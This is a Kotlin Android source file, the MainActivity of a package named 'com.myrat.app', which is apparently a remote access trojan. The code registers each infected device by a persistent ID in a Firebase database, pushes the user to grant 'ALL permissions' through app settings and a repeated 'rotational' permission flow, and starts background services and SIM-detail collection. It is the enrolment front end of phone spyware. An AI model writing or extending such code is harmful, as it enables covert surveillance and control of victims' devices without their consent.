package com.myrat.app

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.handler.PermissionHandler
import com.myrat.app.handler.SimDetailsHandler
import com.myrat.app.service.ServiceManager
import com.myrat.app.utils.Constants
import com.myrat.app.utils.Logger
import com.myrat.app.utils.NotificationHelper
import pub.devrel.easypermissions.EasyPermissions
import java.util.UUID

class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
    private lateinit var deviceId: String
    private lateinit var simDetailsHandler: SimDetailsHandler
    private var permissionHandler: PermissionHandler? = null
    private lateinit var serviceManager: ServiceManager
    private lateinit var deviceRef: com.google.firebase.database.DatabaseReference
    private var doubleBackToExitPressedOnce = false
    private val handler = Handler(Looper.getMainLooper())
    private var permissionsRequested = false
    private var appSettingsVisited = false
    private var isDestroyed = false

    companion object {
        private const val APP_SETTINGS_REQUEST_CODE = 1001
        
        fun getDeviceId(context: Context): String {
            return try {
                val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
                var deviceId = prefs.getString("deviceId", null)
                
                if (deviceId.isNullOrEmpty()) {
                    val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                    deviceId = if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                        androidId
                    } else {
                        UUID.randomUUID().toString()
                    }
                    
                    prefs.edit().putString("deviceId", deviceId).apply()
                    Logger.log("Generated new deviceId: $deviceId")
                }
                
                deviceId ?: "fallback_${System.currentTimeMillis()}"
            } catch (e: Exception) {
                Logger.error("Error getting device ID", e)
                "error_${System.currentTimeMillis()}"
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            // Initialize Firebase first
            if (FirebaseApp.getApps(this).isEmpty()) {
                FirebaseApp.initializeApp(this)
                Logger.log("Firebase initialized")
            }
            
            setContentView(R.layout.activity_main)
            Logger.log("MainActivity onCreate - App Settings First, then Rotational Permissions")
            
            // Create notification channels
            NotificationHelper.createNotificationChannels(this)
            
            // Initialize deviceId
            deviceId = getDeviceId(this)
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, generating new one")
                deviceId = generateFallbackDeviceId()
            }
            
            // Initialize Firebase database reference
            try {
                deviceRef = Firebase.database.getReference("Device").child(deviceId)
                Logger.log("Firebase database reference initialized")
            } catch (e: Exception) {
                Logger.error("Failed to initialize Firebase database reference", e)
                showToastSafely("Database initialization failed")
                return
            }
            
            // Initialize handlers
            try {
                simDetailsHandler = SimDetailsHandler(this, deviceId)
                serviceManager = ServiceManager(this)
                permissionHandler = PermissionHandler(this, simDetailsHandler, serviceManager)
                Logger.log("Handlers initialized successfully")
            } catch (e: Exception) {
                Logger.error("Failed to initialize handlers", e)
                showToastSafely("Handler initialization failed")
                return
            }

            checkAndCreateDeviceNode()
            
            // Check if we've visited app settings before
            val prefs = getSharedPreferences("app_flow", Context.MODE_PRIVATE)
            appSettingsVisited = prefs.getBoolean("app_settings_visited", false)
            
            if (!appSettingsVisited) {
                Logger.log("First launch - opening app settings for manual permission review")
                openAppSettings()
            } else {
                Logger.log("App settings previously visited - starting rotational permission flow")
                startPermissionFlow()
            }
            
        } catch (e: Exception) {
            Logger.error("Critical error in onCreate", e)
            showToastSafely("App initialization failed: ${e.message}")
            
            handler.postDelayed({
                try {
                    if (!isDestroyed && !isFinishing) {
                        finish()
                        startActivity(Intent(this, MainActivity::class.java))
                    }
                } catch (restartException: Exception) {
                    Logger.error("Failed to restart activity", restartException)
                }
            }, 3000)
        }
    }

    private fun showToastSafely(message: String) {
        try {
            if (!isDestroyed && !isFinishing) {
                Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            Logger.error("Error showing toast", e)
        }
    }

    private fun openAppSettings() {
        try {
            Logger.log("🔧 Opening app settings for manual permission configuration")
            
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            startActivityForResult(intent, APP_SETTINGS_REQUEST_CODE)
            
            showToastSafely("Please enable ALL permissions in app settings, then return to the app")
                
        } catch (e: Exception) {
            Logger.error("Failed to open app settings", e)
            startPermissionFlow()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == APP_SETTINGS_REQUEST_CODE) {
            Logger.log("✅ Returned from app settings - marking as visited")
            
            try {
                val prefs = getSharedPreferences("app_flow", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("app_settings_visited", true).apply()
                appSettingsVisited = true
                
                handler.postDelayed({
                    if (!isDestroyed && !isFinishing) {
                        startPermissionFlow()
                    }
                }, 1000)
            } catch (e: Exception) {
                Logger.error("Error handling app settings result", e)
            }
        }
    }

    private fun startPermissionFlow() {
        if (!permissionsRequested && !isDestroyed && !isFinishing) {
            Logger.log("🔄 Starting rotational permission flow with service management...")
            
            handler.postDelayed({
                try {
                    if (!isFinishing && !isDestroyed) {
                        permissionHandler?.requestPermissions()
                        permissionsRequested = true
                    }
                } catch (e: Exception) {
                    Logger.error("Failed to request permissions", e)
                    showToastSafely("Permission request failed")
                }
            }, 1000)
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "fallback_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            Logger.error("Failed to generate fallback device ID", e)
            "emergency_${System.currentTimeMillis()}"
        }
    }

    private fun checkAndCreateDeviceNode() {
        try {
            deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        if (!snapshot.exists()) {
                            deviceRef.child("createdAt").setValue(ServerValue.TIMESTAMP)
                                .addOnSuccessListener {
                                    Log.d("Firebase", "Created new device node: $deviceId")
                                }
                                .addOnFailureListener { e ->
                                    Log.e("FirebaseError", "Failed to create device node: ${e.message}")
                                }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error in onDataChange", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e("FirebaseError", "Error checking device node: ${error.message}")
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to check and create device node", e)
        }
    }

    override fun onResume() {
        super.onResume()
        Logger.log("MainActivity onResume")
        
        if (isFinishing || isDestroyed) {
            Logger.error("MainActivity is finishing or destroyed, skipping onResume")
            return
        }
        
        try {
            if (!appSettingsVisited) {
                Logger.log("App settings not visited yet, waiting...")
                return
            }
            
            permissionHandler?.handleResume()
            serviceManager.checkAndStartAvailableServices()
        } catch (e: Exception) {
            Logger.error("Error in onResume: ${e.message}", e)
            showToastSafely("Error in onResume: ${e.message}")
        }
    }

    override fun onPermissionsGranted(requestCode: Int, perms: MutableList<String>) {
        try {
            permissionHandler?.onPermissionsGranted(requestCode, perms)
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsGranted", e)
        }
    }

    override fun onPermissionsDenied(requestCode: Int, perms: MutableList<String>) {
        try {
            permissionHandler?.onPermissionsDenied(requestCode, perms)
        } catch (e: Exception) {
            Logger.error("Error in onPermissionsDenied", e)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        try {
            EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this)
        } catch (e: Exception) {
            Logger.error("Error in onRequestPermissionsResult", e)
        }
    }

    override fun onBackPressed() {
        try {
            if (doubleBackToExitPressedOnce) {
                super.onBackPressed()
                finish()
                return
            }
            doubleBackToExitPressedOnce = true
            showToastSafely("Please click BACK again to exit")
            handler.postDelayed({ 
                doubleBackToExitPressedOnce = false 
            }, 2000)
        } catch (e: Exception) {
            Logger.error("Error in onBackPressed", e)
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isDestroyed = true
        try {
            permissionHandler?.cleanup()
            serviceManager.cleanup()
            handler.removeCallbacksAndMessages(null)
            Logger.log("MainActivity destroyed and cleaned up")
        } catch (e: Exception) {
            Logger.error("Error in onDestroy", e)
        }
    }
}